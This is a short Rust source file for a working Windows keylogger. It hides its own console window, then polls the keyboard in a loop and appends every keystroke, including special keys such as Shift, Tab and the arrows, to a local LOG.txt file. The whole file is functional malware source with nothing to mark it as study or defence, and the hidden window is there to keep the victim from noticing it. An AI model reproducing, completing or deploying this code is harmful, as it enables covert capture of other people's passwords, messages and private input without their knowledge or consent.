extern crate winapi;
extern crate user32;
extern crate kernel32;
use std::fs::{File, OpenOptions};
use std::io::prelude::*;
#[allow(unused_variables)]
fn main() {
	stealth();
	let mut file = match OpenOptions::new().append(true).open("LOG.txt") {
		Ok(file) => file,
		Err(e) => File::create("LOG.txt").unwrap()
	};
  loop {
  	for i in 8..190 {
    	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
    		let key: String  = match i as u32 {
    			32 => " ".into(),
    			8 => "[Backspace]".into(),
    			13 => "\n".into(),
    			winapi::VK_TAB => "[TAB]".into(),
    			winapi::VK_SHIFT => "[SHIFT]".into(),
    			winapi::VK_CONTROL => "[CTRL]".into(),
    			winapi::VK_ESCAPE => "[ESCAPE]".into(),
    			winapi::VK_END => "[END]".into(),
    			winapi::VK_HOME => "[HOME]".into(),
    			winapi::VK_LEFT => "[LEFT]".into(),
    			winapi::VK_UP => "[UP]".into(),
    			winapi::VK_RIGHT => "[RIGHT]".into(),
    			winapi::VK_DOWN => "[DOWN]".into(),
    			190|110 => ".".into(),
    			_ => (i as u8 as char).to_string()
    		};
    		write!(&mut file,"{}",key).unwrap();
    	}
    }
    file.flush().unwrap();
	}
}

fn stealth() {
	let mut stealth: winapi::HWND;
	unsafe {
		kernel32::AllocConsole();
		stealth = user32::FindWindowA(std::ffi::CString::new("ConsoleWindowClass").unwrap().as_ptr(), std::ptr::null());
		user32::ShowWindow(stealth,0);
	}
}
